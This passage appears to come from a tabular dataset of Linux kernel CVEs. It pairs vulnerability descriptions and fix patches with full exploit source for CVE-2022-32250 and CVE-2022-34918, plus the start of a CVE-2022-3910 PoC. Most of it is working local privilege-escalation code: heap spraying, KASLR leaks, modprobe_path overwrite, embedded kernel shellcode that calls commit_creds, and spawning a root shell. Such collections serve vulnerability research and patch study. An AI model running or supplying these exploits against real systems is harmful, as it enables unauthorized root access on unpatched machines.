    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (nl == NULL) {
        err(1, ""mnl_socket_open"");
    }

    printf(""[+] setting stable %s and set\n"", table_name);
    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, ""mnl_socket_send"");
    }
}

void set_trigger_set_and_overwrite(struct mnl_socket* nl, const char *name, const char *set_name)
{
    char * table_name = name;
    uint8_t family = NFPROTO_IPV4;
    uint32_t set_id = 1;
    struct nftnl_expr * exprs[128];
    int exprid = 0;
    struct nlmsghdr * nlh;

    struct nftnl_set * set_trigger = nftnl_set_alloc();

    nftnl_set_set_str(set_trigger, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(set_trigger, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_FLAGS, NFT_SET_EXPR);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_KEY_LEN, 1);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_FAMILY, family);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_ID, set_id);
    exprs[exprid] = nftnl_expr_alloc(""lookup"");
    nftnl_expr_set_str(exprs[exprid], NFTNL_EXPR_LOOKUP_SET, ""set_stable"");
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);
    nftnl_set_add_expr(set_trigger, exprs[exprid]);
    exprid++;

    char buf[MNL_SOCKET_BUFFER_SIZE*2];

    struct mnl_nlmsg_batch * batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
    int seq = 0;

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWSET, family,
                                    NLM_F_CREATE|NLM_F_ACK, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set_trigger);
    nftnl_set_free(set_trigger);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (nl == NULL) {
        err(1, ""mnl_socket_open"");
    }

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, ""mnl_socket_send"");
    }

    printf(""[+] triggering UAF set and overwrite *(prevchunk+0x18)\n"");
}

void set_cpu_affinity(int cpu_n, pid_t pid) {
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu_n, &set);

    if (sched_setaffinity(pid, sizeof(set), &set) < 0)
        do_error_exit(""sched_setaffinity"");
}

void spray_mqueue(mqd_t mqdes, char *msgptr, int spray_size)
{
    char msgrv[BUFFER];
	unsigned rvprio, sdprio = 1;
	struct timespec ts;
	int unresolved = 0;

	int priority = 0;

    printf(""[*] spraying mqueue...\n"");
    for(int i=0; i<spray_size; i++)
        if (mq_send(mqdes, msgptr, 0x28, sdprio) != 0)
            perror(ERROR_PREFIX ""mq_send"");
}

int gather_mqueue(mqd_t mqdes, int gather_size)
{
    int priority = 0;
    char msg[BUFFER];
    printf(""[*] gathering mqueue...\n"");
    for(int i=0; i<gather_size; i++)
    {
        if (mq_receive(mqdes, (char*) &msg, BUFFER, NULL) != -1)
        {   

            if(*((uint64_t *)msg) & 0xffffffff00000000 != 0xffffffff00000000)
                bye(""[-] can't leak base... \n"");

            base_base = *((uint64_t *)msg) - 0x51af80;
            modprobe_addr = base_base + 0x1e8b320;
            printf(""[+] KASLR base: 0x%llx\n"", base_base);
            printf(""[+] modprobe addr: 0x%llx\n"", modprobe_addr);
        }
    }
    return 0;
}

int gather_mqueue_nosave(mqd_t mqdes, int gather_size)
{
    int priority = 0;
    char msg[BUFFER];
    printf(""[*] gathering mqueue...\n"");
    for(int i=0; i<gather_size; i++)
        mq_receive(mqdes, (char*) &msg, BUFFER, NULL);

    return 0;
}

void spray_msg_msg(unsigned int size, unsigned int amount, int qid)
{
    char buffer[0x2000];
    msg *spray = (msg *)buffer;

    // assert(size >= 0x31 && size <= 0x1000 - 0x8);
    printf(""[*] try to spray msg_msg\n"");
    spray->mtype = 1;

    memset(spray->mtext, 0x41, size - 0x30);

    for (int i = 0; i < amount; i++)
    {
        if(i % 0x10 == 0)
            printf(""[*] spraying msg_msg: 0x%x\n"", i);
        if (msgsnd(qid, spray, size - 0x30, 0) == -1)
        {
            perror(""msgsend failure"");
            exit(-1);
        }
    }
    return;
}

static inline int io_uring_setup(uint32_t entries, struct io_uring_params *p) {
    return syscall(__NR_io_uring_setup, entries, p);
}

static inline int io_uring_register(int fd, unsigned int opcode, void *arg, unsigned int nr_args) {
    return syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);
}


struct fd_uring *spray_uring(uint32_t spray_size, struct fd_uring *fd_buffer) {

    for (uint64_t i = 0; i < spray_size; i++) {

        fd_buffer[i].params = malloc(sizeof(struct io_uring_params));
        if (!fd_buffer[i].params)
            do_error_exit(""malloc"");
        memset(fd_buffer[i].params, 0, sizeof(struct io_uring_params));

        fd_buffer[i].fd = io_uring_setup(SPRAY_NB_ENTRIES, fd_buffer[i].params);
        if (fd_buffer[i].fd < 0)
            do_error_exit(""io_uring_create"");

    }
    return fd_buffer;
}

void release_uring(struct fd_uring *fd_buffer, uint32_t buffer_size) {

    for (uint32_t i = 0; i < buffer_size; i++) {
        close(fd_buffer[i].fd);
    }
    free(fd_buffer);
}

void release_partial_uring(struct fd_uring *fd_buffer, uint32_t buffer_idx) {

    close(fd_buffer[buffer_idx].fd);
}

void prepare_root_shell(void) {
    create_dummy_file();
    create_priv_file();
}

void create_dummy_file(void) {
    int fd;

    fd = open(dummy_file, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
    write(fd, dummy_content, sizeof(dummy_content));
    close(fd);
}

void create_priv_file(void) {
    int fd;

    fd = open(priv_file, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
    write(fd, priv_context, sizeof(priv_context));
    close(fd);

    system(""gcc -o /tmp/shell /tmp/shell.c -w"");
}

void write_new_modprobe() {

    int fd, fd_modprobe;
    char modprobe_name[0x10] = {0, };

    fd_modprobe = open(""/proc/sys/kernel/modprobe"", O_RDONLY);
    read(fd_modprobe, modprobe_name, 14);
    close(fd_modprobe);
    
    printf(""[*] current modprobe name: %s\n"", modprobe_name);
    fd = open(modprobe_name, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
    if (fd < 0)
        do_error_exit(""open"");

    write(fd, new_modprobe_content, sizeof(new_modprobe_content));

    close(fd);
}

void setup_modprobe_payload() {
    write_new_modprobe();
}

void userland_T(int *sema)
{
    while(*sema);
}

void sema_up(int *sema)
{
    *sema = 1;
}

void sema_down(int *sema)
{
    *sema = 0;
}

int main(int argc, char ** argv)
{
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    char c;
    char writebuf[0x2000];

    char mqname[MQUEUE_NUM][NAMELEN] = {""/qname1"", ""/qname2"", ""/qname3"", ""/qname4"", ""/qname5""};
    mqd_t mqid[MQUEUE_NUM];
    struct mq_attr attr;
	attr.mq_flags   = 0;
	attr.mq_maxmsg  = 10;
	attr.mq_msgsize = BUFFER;
	attr.mq_curmsgs = 0;
    int uaf_id = 0;

    int *sema = mmap(NULL, sizeof(int), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    int *sema2 = malloc(0x10);

    prepare_root_shell();
    sema_up(sema);
    if(fork())
    {
        set_cpu_affinity(1, getpid());
        userland_T(sema);
        sleep(1);
        printf(""\n\n[------------------------- stage 4: Execute Malicious File -------------------------------]\n"");
        setup_modprobe_payload();
        execve(""/tmp/dummy"", NULL, NULL);
        execve(""/tmp/shell"", NULL, NULL);
    }

    unshare_setup(getuid(), getgid());

    set_cpu_affinity(0, 0);

    struct fd_uring *fd_buffer = calloc(SPRAY_SIZE, sizeof(struct fd_uring));
    if (!fd_buffer)
        do_error_exit(""calloc"");

    for(int i=0; i<5; i++)
        if((mqid[i] = mq_open(mqname[i], O_CREAT | O_RDWR, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH, &attr)) < 0)
            bye(""MQUEUE"");
    
    struct mnl_socket* nl = mnl_socket_open(NETLINK_NETFILTER);

    printf(""\n\n[------------------------- stage 0: Allocate stable table and set ------------------------]\n"");
    set_stable_table_and_set(nl, ""table1"");
    set_stable_table_and_set(nl, ""table2"");
    set_stable_table_and_set(nl, ""table3"");
    set_stable_table_and_set(nl, ""table4"");

    printf(""\n\n[------------------------- stage 1: Leak heap address ------------------------------------]\n"");
    set_trigger_set_and_overwrite(nl, ""table1"", ""set_trigger0"");
    
    key_serial_t *id_buffer = spray_keyring(0, SPRAY_KEY_SIZE);

    set_trigger_set_and_overwrite(nl, ""table1"", ""set_trigger1"");
    if((uaf_id = get_keyring_leak(id_buffer, SPRAY_KEY_SIZE)) == SPRAY_KEY_SIZE)
        bye(""[-] leak failed..."");

    printf(""\n\n[------------------------- stage 2: Leak KASLR address -----------------------------------]\n"");
    
    spray_uring(SPRAY_SIZE, fd_buffer);

    set_trigger_set_and_overwrite(nl, ""table2"", ""set_trigger2"");
    spray_mqueue(mqid[0], ""TESTMSGTESTMSGTESTMSGTESTMSGTESTMSG"", 4);

    release_partial_uring(fd_buffer, SPRAY_SIZE-1);
    for(int i = 3; i > 113; i++)
        release_partial_uring(fd_buffer, SPRAY_SIZE-i);
    release_partial_uring(fd_buffer, SPRAY_SIZE-2);
    set_trigger_set_and_overwrite(nl, ""table2"", ""set_trigger3"");
    key_serial_t *id_buffer3 = spray_keyring_list_del_purpose(SPRAY_KEY_SIZE*2, heap_base, heap_base, 0x28);// keyring <-> msg_msg overlap
    gather_mqueue(mqid[0], 1);

    sleep(1);
    printf(""\n\n[------------------------- stage 3: Overwrite modprobe_path ------------------------------]\n"");

    set_trigger_set_and_overwrite(nl, ""table3"", ""set_trigger4"");
    spray_mqueue(mqid[1], ""TESTMSGTESTMSGTESTMSGTESTMSGTESTMSG"", 4);
    set_trigger_set_and_overwrite(nl, ""table3"", ""set_trigger5"");
    id_buffer = spray_keyring_list_del_purpose(1, modprobe_addr-0x8+0x1, (heap_base&0xffffffff00000000)+0x2f706d74, 0x10);
    sema_down(sema);
    gather_mqueue_nosave(mqid[1], 1);

    sleep(1);
    for(int i=SPRAY_SIZE/2+12; i<SPRAY_SIZE; i++)
        release_partial_uring(fd_buffer, i);

    while(1);
}

",https://github.com/theori-io/CVE-2022-32250-exploit/tree/main,,,
CVE-2022-34918,https://www.opencve.io/cve/CVE-2022-34918,"An issue was discovered in the Linux kernel through 5.18.9. A type confusion bug in nft_set_elem_init (leading to a buffer overflow) could be used by a local attacker to escalate privileges, a different vulnerability than CVE-2022-32250. (The attacker can obtain root access, but must start with an unprivileged user namespace to obtain CAP_NET_ADMIN access.) This can be fixed in nft_setelem_parse_data in net/netfilter/nf_tables_api.c.","netfilter: nf_tables: stricter validation of element data
Make sure element data type and length do not mismatch the one specified
by the set declaration.

Fixes: 7d7402642eaf (""netfilter: nf_tables: variable sized set element keys / data"")
Reported-by: Hugues ANGUELKOV <hanguelkov@randorisec.fr>
Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>
Diffstat
-rw-r--r--	net/netfilter/nf_tables_api.c	9	
1 files changed, 8 insertions, 1 deletions
diff --git a/net/netfilter/nf_tables_api.c b/net/netfilter/nf_tables_api.c
index 51144fc66889b5..d6b59beab3a986 100644
--- a/net/netfilter/nf_tables_api.c
+++ b/net/netfilter/nf_tables_api.c
@@ -5213,13 +5213,20 @@ static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
 				  struct nft_data *data,
 				  struct nlattr *attr)
 {
+	u32 dtype;
 	int err;
 
 	err = nft_data_init(ctx, data, NFT_DATA_VALUE_MAXLEN, desc, attr);
 	if (err < 0)
 		return err;
 
-	if (desc->type != NFT_DATA_VERDICT && desc->len != set->dlen) {
+	if (set->dtype == NFT_DATA_VERDICT)
+		dtype = NFT_DATA_VERDICT;
+	else
+		dtype = NFT_DATA_VALUE;
+
+	if (dtype != desc->type ||
+	    set->dlen != desc->len) {
 		nft_data_release(data, desc->type);
 		return -EINVAL;
 	}",https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=7e6bc1f6cabcd30aba0b11219d8e01b952eacbb6,"#define _GNU_SOURCE
#include <arpa/inet.h>
#include <limits.h>
#include <linux/netlink.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>

#include <linux/capability.h>
#include <sys/prctl.h>

#include ""common.h""
#include ""fsopen_spray.h""
#include ""keyring.h""
#include ""log.h""
#include ""modprobe.h""
#include ""nf_tables.h""
#include ""raw_packet.h""

#define ID 1337
#define SET_NAME ""nameXXX""
#define LEAK_SET_NAME ""leakXXX""
#define TABLE_NAME ""tableXX""

#define SPRAY_SIZE 10

struct leak_payload {
    uint8_t prefix[PREFIX_BUF_LEN];
    uint8_t rcu_buf[RCU_HEAD_LEN];
    uint16_t len;
} __attribute__((packed));

struct write_payload {
    uint8_t prefix[PREFIX_BUF_LEN];
    void *pg_vec;
    void *pg_vec2;
} __attribute__((packed));

uint8_t shellcode[] = {
    0x48, 0x8d, 0x3d, 0x00, 0x00, 0x00, 0x00, 0x48, 0x81, 0xc7, 0x00, 0x10,
    0x00, 0x00, 0xe8, 0x04, 0x00, 0x00, 0x00, 0x48, 0x31, 0xc0, 0xc3, 0x55,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x54, 0x53, 0x49, 0x89, 0xfc, 0x48, 0x8d,
    0x35, 0x07, 0x02, 0x00, 0x00, 0x6a, 0x0d, 0x5a, 0xe8, 0x85, 0x01, 0x00,
    0x00, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x71, 0x01, 0x00, 0x00, 0x48, 0x89,
    0xc3, 0x48, 0x8d, 0x35, 0x2c, 0x02, 0x00, 0x00, 0x6a, 0x14, 0x5a, 0x4c,
    0x89, 0xe7, 0xe8, 0x67, 0x01, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x0f, 0x84,
    0x53, 0x01, 0x00, 0x00, 0x48, 0x63, 0x2b, 0x48, 0x01, 0xdd, 0x48, 0x63,
    0x08, 0x48, 0x01, 0xc1, 0x31, 0xff, 0xff, 0xd1, 0x48, 0x89, 0xc7, 0xff,
    0xd5, 0x48, 0x8d, 0x35, 0xc9, 0x01, 0x00, 0x00, 0x6a, 0x0a, 0x5a, 0x4c,
    0x89, 0xe7, 0xe8, 0x37, 0x01, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x0f, 0x84,
    0x23, 0x01, 0x00, 0x00, 0x48, 0x89, 0xc3, 0x48, 0x8d, 0x35, 0xb5, 0x01,
    0x00, 0x00, 0x6a, 0x09, 0x5a, 0x4c, 0x89, 0xe7, 0xe8, 0x19, 0x01, 0x00,
    0x00, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x05, 0x01, 0x00, 0x00, 0x48, 0x63,
    0x0b, 0x48, 0x01, 0xd9, 0x48, 0x63, 0x18, 0x48, 0x01, 0xc3, 0x6a, 0x01,
    0x5f, 0xff, 0xd1, 0x48, 0x89, 0xc7, 0x31, 0xf6, 0xff, 0xd3, 0x49, 0x89,
    0xc6, 0x48, 0x8d, 0x35, 0x88, 0x01, 0x00, 0x00, 0x6a, 0x0c, 0x5a, 0x4c,
    0x89, 0xe7, 0xe8, 0xe3, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x0f, 0x84,
    0xcf, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc7, 0x48, 0x63, 0x18, 0x48, 0x8d,
    0x35, 0x73, 0x01, 0x00, 0x00, 0x6a, 0x0c, 0x5a, 0x4c, 0x89, 0xe7, 0xe8,
    0xc2, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xae, 0x00, 0x00,
    0x00, 0x49, 0x01, 0xdf, 0x49, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xff, 0xff, 0x4c, 0x63, 0x10, 0x49, 0x01, 0xc2, 0x49, 0x8d, 0x8f, 0xa0,
    0x00, 0x00, 0x00, 0x4c, 0x89, 0xfa, 0x48, 0x39, 0xca, 0x0f, 0x83, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x8b, 0x02, 0x4c, 0x39, 0xc0, 0x73, 0x06, 0x48,
    0x83, 0xc2, 0x08, 0xeb, 0xe9, 0x48, 0x8d, 0xb0, 0x00, 0x30, 0x00, 0x00,
    0x48, 0x89, 0xc7, 0x48, 0x39, 0xf7, 0x73, 0xeb, 0x48, 0x39, 0x07, 0x48,
    0x8d, 0x7f, 0x08, 0x75, 0xf2, 0x48, 0x85, 0xc0, 0x74, 0x5d, 0x6a, 0x01,
    0x41, 0x5c, 0x49, 0x89, 0xc3, 0x49, 0x39, 0xf3, 0x73, 0x51, 0x4d, 0x8b,
    0x0b, 0x4d, 0x39, 0xc1, 0x72, 0x34, 0x4c, 0x39, 0xc8, 0x74, 0x2f, 0x49,
    0x8d, 0x49, 0x60, 0x31, 0xd2, 0x31, 0xdb, 0x4c, 0x89, 0xcf, 0x48, 0x39,
    0xcf, 0x73, 0x1f, 0x48, 0x8b, 0x2f, 0x4c, 0x39, 0xfd, 0x41, 0x0f, 0x44,
    0xd4, 0x4c, 0x39, 0xd5, 0x41, 0x0f, 0x44, 0xdc, 0x48, 0x83, 0xc7, 0x08,
    0x85, 0xdb, 0x74, 0xe2, 0x85, 0xd2, 0x74, 0xde, 0xeb, 0x06, 0x49, 0x83,
    0xc3, 0x08, 0xeb, 0xb9, 0x4d, 0x85, 0xc9, 0x74, 0x0a, 0x4c, 0x89, 0xc9,
    0x48, 0x29, 0xc1, 0x4d, 0x89, 0x0c, 0x0e, 0x31, 0xc0, 0x5b, 0x41, 0x5c,
    0x41, 0x5e, 0x41, 0x5f, 0x5d, 0xc3, 0x53, 0x49, 0x89, 0xd0, 0x49, 0xf7,
    0xd8, 0x41, 0xb9, 0x00, 0x00, 0x00, 0x02, 0x31, 0xc0, 0x49, 0x89, 0xfb,
    0x4e, 0x8d, 0x14, 0x07, 0x4d, 0x01, 0xca, 0x4d, 0x39, 0xd3, 0x77, 0x52,
    0x41, 0x8a, 0x0b, 0x3a, 0x0e, 0x75, 0x15, 0x31, 0xc9, 0x48, 0x39, 0xca,
    0x74, 0x13, 0x41, 0x8a, 0x1c, 0x0b, 0x3a, 0x1c, 0x0e, 0x75, 0x05, 0x48,
    0xff, 0xc1, 0xeb, 0xed, 0x49, 0xff, 0xc3, 0xeb, 0xda, 0x49, 0x01, 0xf9,
    0x48, 0x83, 0xe7, 0xfc, 0x4c, 0x39, 0xcf, 0x73, 0x13, 0x8b, 0x0f, 0x4c,
    0x89, 0xdb, 0x48, 0x29, 0xcb, 0x48, 0x39, 0xfb, 0x74, 0x11, 0x48, 0x83,
    0xc7, 0x04, 0xeb, 0xe8, 0x49, 0x01, 0xd3, 0x4d, 0x29, 0xd9, 0x4c, 0x89,
    0xdf, 0xeb, 0xa9, 0x48, 0x83, 0xc7, 0xfc, 0x48, 0x89, 0xf8, 0x5b, 0xc3,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x63, 0x6f, 0x6d, 0x6d,
    0x69, 0x74, 0x5f, 0x63, 0x72, 0x65, 0x64, 0x73, 0x00, 0x66, 0x69, 0x6e,
    0x64, 0x5f, 0x76, 0x70, 0x69, 0x64, 0x00, 0x70, 0x69, 0x64, 0x5f, 0x74,
    0x61, 0x73, 0x6b, 0x00, 0x69, 0x6e, 0x69, 0x74, 0x5f, 0x70, 0x69, 0x64,
    0x5f, 0x6e, 0x73, 0x00, 0x69, 0x6e, 0x69, 0x74, 0x5f, 0x75, 0x74, 0x73,
    0x5f, 0x6e, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x70, 0x72, 0x65, 0x70, 0x61, 0x72, 0x65, 0x5f, 0x6b, 0x65, 0x72, 0x6e,
    0x65, 0x6c, 0x5f, 0x63, 0x72, 0x65, 0x64, 0x00};

int netfilter_sock = -1;
struct leak_data leak_ptrs = {0};
int fsopen_fds[SPRAY_FS_CONTEXT_CNT] = {0};

void init_netfilter(void) {
    struct sockaddr_nl snl;

    logd(""creating netfilter netlink socket"");
    if ((netfilter_sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) < 0) {
        die(""can't create netfilter socket: %m"");
    }

    memset(&snl, 0, sizeof(snl));
    snl.nl_family = AF_NETLINK;
    snl.nl_pid = getpid();
    if (bind(netfilter_sock, (struct sockaddr *)&snl, sizeof(snl)) < 0) {
        die(""bind: %m"");
    }

    logd(""register netfilter table"");
    create_table(netfilter_sock, TABLE_NAME);

    logd(""creating a netfilter set for the info leak"");
    create_set(netfilter_sock, LEAK_SET_NAME, KMALLOC192_KEYLEN, sizeof(struct leak_payload), TABLE_NAME, ID);

    logd(""creating a netfilter set for the write primitive"");
    create_set(netfilter_sock, SET_NAME, KMALLOC192_KEYLEN, sizeof(struct write_payload), TABLE_NAME, ID + 1);
}

void do_init(void) {
    set_cpu_affinity(0, 0);
    init_namespace();
    init_netfilter();
}

int do_leak(void) {
    key_serial_t key_ids[SPRAY_KEY_CNT] = {0};
    key_serial_t corrupted_key_id = 0;

    struct leak_payload payload;
    memset(&payload, 0, sizeof(struct leak_payload));
    payload.len = CORRUPT_SIZE;

retry:
    logd(""spraying user_key_payload ..."");
    spray_keyring(key_ids, SPRAY_KEY_CNT);

    logd(""free some key to create holes ..."");
    for (int i = FREE_HOLE_BEGIN; i < SPRAY_KEY_CNT; i += FREE_HOLE_STEP) {
        release_key(key_ids[i]);
        key_ids[i] = 0;
    }

    logd(""trigger oob write ..."");
    add_elem_to_set(netfilter_sock, LEAK_SET_NAME, KMALLOC192_KEYLEN, TABLE_NAME,
                    ID, sizeof(struct leak_payload), (uint8_t *)&payload);

    logd(""checking if keyring is corrupted ..."");
    if (is_keyring_corrupted(key_ids, SPRAY_KEY_CNT, &corrupted_key_id)) {
        logi(""found keyring %d is corrupted!"", corrupted_key_id);
    } else {
        logw(""can't found corrupted keyring, retry ..."");
        release_keys(key_ids, SPRAY_KEY_CNT);
        goto retry;
    }

    logd(""free other keyring to set rcu.func in user_key_payload ..."");
    for (int i = FREE_HOLE_BEGIN; i < SPRAY_KEY_CNT; i++) {
        if (key_ids[i] == corrupted_key_id) {
            continue;
        }
        release_key(key_ids[i]);
        key_ids[i] = 0;
    }

    logd(""spray struct fs_context in kmalloc-192 ..."");
    spray_fs_context(fsopen_fds, SPRAY_FS_CONTEXT_CNT);

    logd(""searching leak ..."");
    if (get_keyring_leak(corrupted_key_id, &leak_ptrs)) {
        logw(""can't find fs_context"");
        for (int i = 0; i < SPRAY_KEY_CNT; i++) {
            release_key(key_ids[i]);
            key_ids[i] = 0;
        }
        close_fds(fsopen_fds, SPRAY_FS_CONTEXT_CNT);
        return 1;
    }

    logi(""leak fs_context_ops: 0x%08lx"", leak_ptrs.fs_context_ops);

    return 0;
}

int do_write_primitive(void) {
    int not_found = 1;
    struct write_payload payload;

    /* Prepare the payload for the write primitive */
    memset(&payload, 0, sizeof(struct write_payload));
    if (!leak_ptrs.parse_param_fptr) {
        payload.pg_vec = (void *)(leak_ptrs.fs_context_ops & ~0xfff);
        payload.pg_vec2 = (void *)(leak_ptrs.fs_context_ops & ~0xfff);
    } else {
        payload.pg_vec = (void *)(leak_ptrs.parse_param_fptr & ~0xfff);
        payload.pg_vec2 = (void *)((leak_ptrs.parse_param_fptr & ~0xfff) + 0x1000);
    }

    int spray_page_fds[0x100];
    int page_fds[0x100];

    // fengshui
    for (int i = 0; i < 0x100; i++) {
        spray_page_fds[i] = pagealloc_pad(17, 0x1000);
    }

    memset(page_fds, 0, sizeof(page_fds));
    for (int i = 0; i < 0x100; i++) {
        page_fds[i] = pagealloc_pad(17, 0x1000);
    }

    for (int i = 0; i < 0x100; i += 0x20) {
        close(page_fds[i]);
        page_fds[i] = 0;
    }

    add_elem_to_set(netfilter_sock, SET_NAME, KMALLOC192_KEYLEN, TABLE_NAME, ID, sizeof(struct write_payload), (uint8_t *)&payload);

    // try to mmap raw_packet
    for (int i = 0; i < 0x100; i++) {
        if (!page_fds[i]) {
            continue;
        }
        char *p = (char *)mmap(NULL, 0x1000 * 17, PROT_READ | PROT_WRITE, MAP_SHARED, page_fds[i], 0);
        if (!p || (ssize_t)p < 0) {
            loge(""mmap error: %p"", p);
            continue;
        }
        int j;
        for (j = 0x30; j < 0x1000; j++) {
            if (p[j] != 0) {
                break;
            }
        }
        if (j != 0x1000) {
            logi(""found target page!!"");
            if (!leak_ptrs.parse_param_fptr) {
                uint64_t *pos = (uint64_t *)&p[leak_ptrs.fs_context_ops & 0xfff];
                leak_ptrs.parse_param_fptr = pos[2];
                logi(""leak parse_param: 0x%08lx"", leak_ptrs.parse_param_fptr);

            } else {
                uint64_t *pos = (uint64_t *)&p[leak_ptrs.parse_param_fptr & 0xfff];
                uint8_t backup[sizeof(shellcode)] = {0};

                logd(""write shellcode:"");
                hexdump(shellcode, sizeof(shellcode));

                memcpy(backup, pos, sizeof(backup));
                memcpy(pos, shellcode, sizeof(shellcode));

                fsconfig(fsopen_fds[0], FSCONFIG_SET_STRING, ""\x00"", ""AAAA"", 0);

                memcpy(pos, backup, sizeof(backup));
            }

            not_found = 0;
            break;
        }
    }

    for (int i = 0; i < 0x100; i++) {
        if (spray_page_fds[i]) {
            close(spray_page_fds[i]);
        }
    }

    for (int i = 0; i < 0x100; i++) {
        if (page_fds[i]) {
            close(page_fds[i]);
        }
    }

    return not_found;
}

int main(int argc, char **argv) {
    logd(""initialize exploit environment ..."");
    do_init();

    while (do_leak()) {
        usleep(100 * 1000);
        logw(""retry ..."");
    }

    // leak func ptr
    while (do_write_primitive()) {
        usleep(100 * 1000);
        logw(""retry ..."");
    }

    // write shellcode
    while (do_write_primitive()) {
        usleep(100 * 1000);
        logw(""retry ..."");
    }

    logd(""uid=%d, euid=%d"", getuid(), geteuid());
    execl(""/bin/sh"", ""sh"", NULL);

    return 0;
}

",https://github.com/veritas501/CVE-2022-34918/tree/master,,,存在多种PoC
CVE-2022-3910,https://www.opencve.io/cve/CVE-2022-3910,"Use After Free vulnerability in Linux Kernel allows Privilege Escalation. An improper Update of Reference Count in io_uring leads to Use-After-Free and Local Privilege Escalation.
When io_msg_ring was invoked with a fixed file, it called io_fput_file() which improperly decreased its reference count (leading to Use-After-Free and Local Privilege Escalation). Fixed files are permanently registered to the ring, and should not be put separately.

We recommend upgrading past commit  https://github.com/torvalds/linux/commit/fc7222c3a9f56271fba02aabbfbae999042f1679 https://github.com/torvalds/linux/commit/fc7222c3a9f56271fba02aabbfbae999042f1679 
","
io_uring/msg_ring: check file type before putting
If we're invoked with a fixed file, follow the normal rules of not
calling io_fput_file(). Fixed files are permanently registered to the
ring, and do not need putting separately.

@@ -165,7 +165,8 @@ int io_msg_ring(struct io_kiocb *req, unsigned int issue_flags)
		req_set_fail(req);
	io_req_set_res(req, ret, 0);
	/* put file to avoid an attempt to IOPOLL the req */
-	io_put_file(req->file);
+	if (!(req->flags & REQ_F_FIXED_FILE))
+		io_put_file(req->file);
	req->file = NULL;
	return IOU_OK;
}",https://github.com/torvalds/linux/commit/fc7222c3a9f56271fba02aabbfbae999042f1679,"// gcc poc.c -o poc -static -no-pie -s -luring \
//     -L ./liburing/ -I ./liburing/include

#define _GNU_SOURCE

#include <fcntl.h>
#include <linux/kcmp.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <syscall.h>
#include <unistd.h>

#include ""liburing.h""

#define COLOR_GREEN ""\033[32m""
#define COLOR_RED ""\033[31m""
#define COLOR_YELLOW ""\033[33m""
#define COLOR_DEFAULT ""\033[0m""

#define logd(fmt, ...)                                                         \
    dprintf(2, ""[*] %s:%d "" fmt ""\n"", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                         \
    dprintf(2, COLOR_GREEN ""[+] %s:%d "" fmt ""\n"" COLOR_DEFAULT, __FILE__,      \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                         \
    dprintf(2, COLOR_YELLOW ""[!] %s:%d "" fmt ""\n"" COLOR_DEFAULT, __FILE__,     \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                         \
    dprintf(2, COLOR_RED ""[-] %s:%d "" fmt ""\n"" COLOR_DEFAULT, __FILE__,        \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                                                          \
    do {                                                                       \
        loge(fmt, ##__VA_ARGS__);                                              \
        loge(""Exit at line %d"", __LINE__);                                     \
        exit(1);                                                               \
    } while (0)

#define TEMP_WORKDIR ""/tmp/exp_dir""
#define TEMP_VICTIM_FILE ""x""

void prepare_workdir() {
    logd(""perpare the environment ..."");
    char *cmdline;
    asprintf(&cmdline, ""rm -rf %s && mkdir -p %s && touch '%s/%s'"",
             TEMP_WORKDIR, TEMP_WORKDIR, TEMP_WORKDIR, TEMP_VICTIM_FILE);
    if (system(cmdline) != 0) {
        die(""create temp workdir: %m"");
    }

    if (chmod(TEMP_WORKDIR, 0777)) {
        die(""chmod: %m"");
    }

